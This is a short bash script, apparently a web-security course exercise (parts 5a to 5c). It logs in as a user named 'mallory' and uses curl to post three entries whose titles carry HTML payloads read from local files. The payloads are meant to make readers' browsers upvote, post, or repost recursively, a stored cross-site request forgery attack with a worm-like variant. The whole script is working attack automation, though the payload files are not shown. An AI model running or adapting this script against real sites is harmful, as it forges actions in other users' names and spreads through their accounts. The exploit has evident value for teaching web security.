#!/bin/bash

baseUrl=$1

# 5a) create a post with CSRF functioning title
# login as mallory
curl -X POST $baseUrl/post.php \
  -d "username=mallory&password=MyPassword&form=login" \
  -c cookie.txt -v 2> >(grep "<" > response.txt) 

# leave exploit post
curl -X POST $baseUrl/post.php \
  -d "type=1&form=content&content=exploit5a" \
  --data-urlencode "title=$(cat upvote_url.html)"\
  -b cookie.txt -v 2> >(grep "<" >> response.txt) 

# 5b)
# leave exploit post
curl -X POST $baseUrl/post.php \
  -d "type=1&form=content&content=exploit5b" \
  --data-urlencode "title=$(cat post_url.html | tr '\n' ' ')"\
  -b cookie.txt -v 2> >(grep "<" >> response.txt) 

# 5c)
# leave exploit post
curl -X POST $baseUrl/post.php \
  -d "type=1&form=content&content=exploit5c" \
  --data-urlencode "title=$(cat recursive_post_url.html | tr '\n' ' ')"\
  -b cookie.txt -v 2> >(grep "<" >> response.txt) 

